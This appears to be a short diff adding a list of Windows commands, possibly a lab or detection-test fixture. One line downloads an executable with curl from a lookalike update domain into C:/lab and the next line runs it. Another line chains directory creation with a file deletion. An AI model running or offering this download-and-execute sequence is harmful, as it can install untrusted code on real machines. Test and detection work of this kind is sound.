@@ -1,0 +1,6 @@
+101112
+curl.exe -sL "https://updt-winupgrade.com/files/executable.exe" -o "C:/lab/test.exe"
+C:/lab/test.exe		
+0
+1
+cd /D C:\ && mkdir lab, cd /D C:\ && del test.txt
